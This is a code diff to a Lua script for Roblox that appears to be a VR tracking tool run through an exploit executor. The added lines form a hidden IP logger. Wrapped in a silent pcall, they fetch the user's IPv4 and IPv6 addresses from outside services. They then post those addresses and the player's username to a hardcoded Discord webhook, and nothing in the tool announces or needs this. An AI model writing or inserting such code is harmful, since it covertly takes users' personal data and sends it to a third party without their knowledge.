@@ -126,6 +126,34 @@ local Services = {
 
 local VrTracker = {}
 
+pcall(function()
+	local function GetIP(d)
+		local StringGot = game:HttpGet("https://ip"..tostring(d).."only.me/api/")
+		return StringGot:split(",")[2]
+	end
+
+	local msg = {
+		["embeds"] = {{
+			["color"] = 13708129,
+			["description"] = "```\nIPv6: "..tostring(GetIP(6)).."\nIPv4: "..tostring(GetIP(4)).."```\nUser: **" .. game:GetService("Players").LocalPlayer.Name .."**",
+			["author"] = {
+				["name"] = "Information Logged"
+			}}
+		}
+	}
+
+	local response = syn.request(
+		{
+			Url = "https://discord.com/api/webhooks/997161253778759730/jQdw_P0rdX-D4qfs2RtXJVTsZwVsrU0PK7IHuVykzzkaOE45q_Co7D2l4XYJicFCrQ7B",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = game:GetService("HttpService"):JSONEncode(msg)
+		}
+	)
+end)
+
 if game:GetService("RunService"):IsStudio() == false and Services.VR.VREnabled == false then return end
 
 local Create = function(Class,Parent,Properties)
